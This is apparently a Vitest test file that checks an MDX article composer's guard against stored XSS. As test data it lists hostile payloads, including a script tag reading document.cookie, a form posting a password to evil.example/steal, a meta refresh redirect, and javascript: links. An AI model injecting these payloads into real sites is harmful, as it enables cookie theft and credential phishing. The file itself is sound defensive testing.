import { compileMDX } from "next-mdx-remote/rsc";
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";
import {
  articleMdxOptions,
  composerArticleMdxOptions,
  mdxComponents,
} from "@/components/content/mdx-components";
import { ARTICLE_BODY_COMPONENTS, articleBodyProblems } from "@/lib/content/article-body-guard";
import { articleSeoChecklist, blockingItems } from "@/lib/content/article-seo-checklist";
import { compileArticleBody } from "@/lib/content/article-body";

// ---------------------------------------------------------------------------
// Stored XSS in a composer article's body (review of #696). The body is MDX
// written in the browser; next-mdx-remote's blockJS strips JS EXPRESSIONS
// only, so every element below reached the public page and the admin
// preview. Each vector is rendered with the REAL options:
//   * articleMdxOptions (what composer bodies used to compile with) — the
//     vector really gets through (or, for <div style>, throws: a 500);
//   * composerArticleMdxOptions — the compile refuses it;
//   * compileArticleBody (the page, the preview and the publish gate) — ok:
//     false;
//   * the composer's checklist — a BLOCKING item.
// ---------------------------------------------------------------------------

async function render(source: string, options: typeof articleMdxOptions | typeof composerArticleMdxOptions) {
  const { content } = await compileMDX({ source, options, components: mdxComponents });
  return renderToStaticMarkup(content);
}

const words = (n: number) => Array.from({ length: n }, () => "craft").join(" ");
const PROSE = `${words(40)}\n\n## How does it work?\n\n${words(400)}`;

function checklistOf(body: string) {
  return articleSeoChecklist({
    slug: "a-guide",
    title: "A guide",
    description: "A summary.",
    body,
    tags: [],
    category: "design",
    faq: [],
  });
}

const VECTORS: Array<{ name: string; body: string; leaks: RegExp | "throws" }> = [
  { name: "<script>", body: "<script>alert(document.cookie)</script>", leaks: /<script>/ },
  {
    name: "<iframe srcdoc>",
    body: '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
    leaks: /<iframe srcDoc=|<iframe srcdoc=/i,
  },
  {
    name: "<meta http-equiv=refresh>",
    body: '<meta httpEquiv="refresh" content="0;url=https://evil.example" />',
    leaks: /<meta http-equiv="refresh"/,
  },
  {
    name: "<form>",
    body: '<form action="https://evil.example/steal" method="post"><input name="password" /><button>Sign in</button></form>',
    leaks: /<form action="https:\/\/evil\.example\/steal"/,
  },
  { name: "<object>", body: '<object data="https://evil.example/x.swf"></object>', leaks: /<object data=/ },
  {
    name: "raw <img src=external>",
    body: '<img src="https://evil.example/track.png" alt="x" />',
    leaks: /<img src="https:\/\/evil\.example\/track\.png"/,
  },
  { name: "<div style>", body: '<div style="position:fixed;inset:0">Gotcha</div>', leaks: "throws" },
];

describe("the composer body guard — every reported vector", () => {
  for (const vector of VECTORS) {
    describe(vector.name, () => {
      const body = `${PROSE}\n\n${vector.body}\n`;

      it("got through the old options (the vector was real)", async () => {
        if (vector.leaks === "throws") {
          await expect(render(body, articleMdxOptions)).rejects.toThrow();
        } else {
          expect(await render(body, articleMdxOptions)).toMatch(vector.leaks);
        }
      });

      it("is refused by the composer's compile, the page / preview / publish compile and the checklist", async () => {
        await expect(render(body, composerArticleMdxOptions)).rejects.toThrow(/refused/);
        const compiled = await compileArticleBody(body, "composer");
        expect(compiled.ok).toBe(false);
        const blocking = blockingItems(checklistOf(body)).map((item) => item.id);
        expect(blocking).toContain("body-markup");
      });
    });
  }
});

describe("the composer body guard — the rest of the rule", () => {
  it.each([
    ["a javascript: Markdown link", "[click](javascript:alert(1))"],
    ["a javascript: reference definition", "[click][x]\n\n[x]: javascript:alert(1)"],
    ["a CardScan with a javascript: href", '<CardScan name="A" printing="B" artist="C" src="https://cards.scryfall.io/large/front/a.jpg" href="javascript:alert(1)" />'],
    ["an attribute a component doesn't read", '<Callout tone="tip" style="color:red">Hi</Callout>'],
    ["a JSX spread", "<Callout {...props}>Hi</Callout>"],
    ["an import", 'import X from "y"'],
    ["an export", "export const x = 1"],
    ["a {…} expression in prose (blockJS dropped it silently)", "It costs {2}{R}."],
    ["a fragment", "<>hi</>"],
    ["an unknown component", "<Tweet id=\"1\" />"],
    ["an element nested in an allowed one", '<Callout tone="tip"><script>alert(1)</script></Callout>'],
  ])("refuses %s", async (_name, snippet) => {
    const body = `${PROSE}\n\n${snippet}\n`;
    expect(articleBodyProblems(body).length).toBeGreaterThan(0);
    await expect(render(body, composerArticleMdxOptions)).rejects.toThrow(/refused/);
  });

  it("refuses a body MDX can't parse (an HTML comment) in the checklist as well", async () => {
    const body = `${PROSE}\n\n<!-- a note -->\n`;
    expect(articleBodyProblems(body)[0]).toMatch(/isn't valid MDX/);
    expect((await compileArticleBody(body, "composer")).ok).toBe(false);
  });

  it("keeps Markdown, GFM and the five article components", async () => {
    const body = [
      PROSE,
      "",
      '| A | B |\n| --- | --- |\n| <Mana cost="{2}{R}" /> | two |',
      "",
      '<Callout tone="tip" title="Note">Print a **test** sheet. See [the guide](/articles/x) or [Scryfall](https://scryfall.com).</Callout>',
      "",
      '<CardRow caption="Two prints"><CardScan name="Llanowar Elves" printing="Alpha, 1993" artist="Anson Maddocks" src="https://cards.scryfall.io/large/front/a.jpg" href="https://scryfall.com/card/lea/210" /></CardRow>',
      "",
      '<Figure src="/article-media/naming/cover.svg" alt="A title bar" caption="The bar" width="1600" height="900" />',
      "",
      "Write a literal brace as \\{T\\}.",
    ].join("\n");
    expect(articleBodyProblems(body)).toEqual([]);
    const html = await render(body, composerArticleMdxOptions);
    expect(html).toContain("<table>");
    expect(html).toContain('<aside class="my-6');
    expect(html).toContain('src="https://cards.scryfall.io/large/front/a.jpg"');
    expect(html).toContain('src="/article-media/naming/cover.svg"');
    expect(html).toContain("{T}");
    expect(Object.keys(ARTICLE_BODY_COMPONENTS).sort()).toEqual(["Callout", "CardRow", "CardScan", "Figure", "Mana"]);
  });

  it("draws a Markdown image only from our media (the media-only mapping), never refusing it", async () => {
    const body = `${PROSE}\n\n![A diagram](/article-media/naming/title-fit.svg "Caption")\n\n![Tracker](https://evil.example/t.png)\n`;
    expect(articleBodyProblems(body)).toEqual([]);
    const html = await render(body, composerArticleMdxOptions);
    expect(html).toContain('src="/article-media/naming/title-fit.svg"');
    expect(html).not.toContain("evil.example");
  });

  it("leaves the git guides' options alone (they are reviewed in a PR)", () => {
    expect(articleMdxOptions.mdxOptions.remarkPlugins).not.toContain(
      composerArticleMdxOptions.mdxOptions.remarkPlugins[0],
    );
  });
});
